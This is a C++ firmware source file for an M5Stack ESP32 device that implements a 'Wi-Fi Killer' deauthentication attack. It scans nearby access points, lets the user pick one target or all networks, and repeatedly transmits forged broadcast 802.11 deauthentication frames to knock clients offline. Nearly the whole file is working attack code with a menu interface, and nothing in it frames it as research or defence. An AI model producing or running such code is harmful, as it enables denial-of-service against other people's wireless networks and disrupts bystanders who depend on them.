#include "deauth_controller.h"
#include "display.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

bool deauthActive = false;
int deauthPacketCount = 0;
std::vector<String> apList;
std::vector<uint8_t*> apBSSID;
int selectedTarget = -1;
int menuCursor = 0;
bool inTargetSelect = false;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[2];
} wifi_ieee80211_deauth_frame_t;

void initDeauth() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    deauthActive = false;
    deauthPacketCount = 0;
    selectedTarget = -1;
    apList.clear();
    apBSSID.clear();
    scanNetworks();
}

void scanNetworks() {
    apList.clear();
    apBSSID.clear();
    wifi_scan_config_t scanConf = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 100, .max = 300 } }
    };
    esp_wifi_scan_start(&scanConf, true);
    
    uint16_t apCount = 0;
    wifi_ap_record_t *apRecords = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * 20);
    esp_wifi_scan_get_ap_records(&apCount, apRecords);
    
    for (int i = 0; i < apCount && i < 20; i++) {
        String ssid = String((char*)apRecords[i].ssid);
        if (ssid.length() > 0) {
            apList.push_back(ssid);
            uint8_t* bssid = (uint8_t*)malloc(6);
            memcpy(bssid, apRecords[i].bssid, 6);
            apBSSID.push_back(bssid);
        }
    }
    free(apRecords);
    apList.push_back("ALL NETWORKS");
    apBSSID.push_back(NULL);
}

void sendDeauthPacket(uint8_t *bssid) {
    wifi_ieee80211_deauth_frame_t deauth_frame = {0};
    deauth_frame.hdr.frame_ctrl = 0xC0;
    deauth_frame.hdr.duration = 0;
    memset(deauth_frame.hdr.da, 0xFF, 6);
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    memcpy(deauth_frame.hdr.sa, mac, 6);
    memcpy(deauth_frame.hdr.bssid, bssid, 6);
    deauth_frame.hdr.seq_ctrl = 0;
    deauth_frame.payload[0] = 0x01;
    deauth_frame.payload[1] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
    deauthPacketCount++;
}

void startDeauthAttack() {
    deauthActive = true;
}

void stopDeauthAttack() {
    deauthActive = false;
}

void selectTarget(int index) {
    if (index >= 0 && index < (int)apList.size()) {
        selectedTarget = index;
        inTargetSelect = false;
    }
}

void renderDeauthUI() {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.fillRect(0, 0, 240, 18, NAVY);
    M5.Lcd.setTextColor(WHITE, NAVY);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(6, 5);
    M5.Lcd.print("Wi-Fi Killer");
    drawBatteryIndicator(212, 1);

    if (!inTargetSelect) {
        M5.Lcd.setTextColor(WHITE, BLACK);
        M5.Lcd.setTextSize(1);
        M5.Lcd.setCursor(6, 24);
        M5.Lcd.printf("Status: %s", deauthActive ? "ACTIVE" : "STOPPED");
        M5.Lcd.setCursor(6, 36);
        M5.Lcd.printf("Packets: %d", deauthPacketCount);
        M5.Lcd.setCursor(6, 48);
        M5.Lcd.printf("Target: %s", selectedTarget >= 0 && selectedTarget < (int)apList.size() ? apList[selectedTarget].c_str() : "None");

        const char* menuItems[] = {"[A] Start/Stop", "[B] Select Target", "[A Long] Back"};
        for (int i = 0; i < 3; i++) {
            int y = 70 + (i * 16);
            M5.Lcd.setTextColor(menuCursor == i ? YELLOW : DARKGREY, BLACK);
            M5.Lcd.setCursor(6, y);
            M5.Lcd.print(menuItems[i]);
        }
    } else {
        M5.Lcd.setTextColor(WHITE, BLACK);
        M5.Lcd.setTextSize(1);
        M5.Lcd.setCursor(6, 24);
        M5.Lcd.print("Select Target:");
        int y = 36;
        for (int i = 0; i < (int)apList.size() && i < 8; i++) {
            if (i == menuCursor) {
                M5.Lcd.setTextColor(YELLOW, BLACK);
                M5.Lcd.setCursor(6, y);
                M5.Lcd.printf("> %s", apList[i].c_str());
            } else {
                M5.Lcd.setTextColor(WHITE, BLACK);
                M5.Lcd.setCursor(6, y);
                M5.Lcd.print(apList[i].c_str());
            }
            y += 14;
        }
        M5.Lcd.setTextColor(DARKGREY, BLACK);
        M5.Lcd.setCursor(6, 122);
        M5.Lcd.print("[B] Next  [A] Select  [A Long] Back");
    }
}

void handleDeauthSelect() {
    if (!inTargetSelect) {
        if (menuCursor == 0) {
            if (!deauthActive) {
                startDeauthAttack();
            } else {
                stopDeauthAttack();
            }
            renderDeauthUI();
        } else if (menuCursor == 1) {
            inTargetSelect = true;
            menuCursor = 0;
            renderDeauthUI();
        }
    } else {
        if (menuCursor >= 0 && menuCursor < (int)apList.size()) {
            selectTarget(menuCursor);
            renderDeauthUI();
        }
    }
}

void loopDeauth() {
    if (deauthActive) {
        if (selectedTarget >= 0 && selectedTarget < (int)apBSSID.size()) {
            if (apBSSID[selectedTarget] != NULL) {
                sendDeauthPacket(apBSSID[selectedTarget]);
            } else {
                for (int i = 0; i < (int)apBSSID.size(); i++) {
                    if (apBSSID[i] != NULL) {
                        sendDeauthPacket(apBSSID[i]);
                    }
                }
            }
        }
        delay(50);
    }
}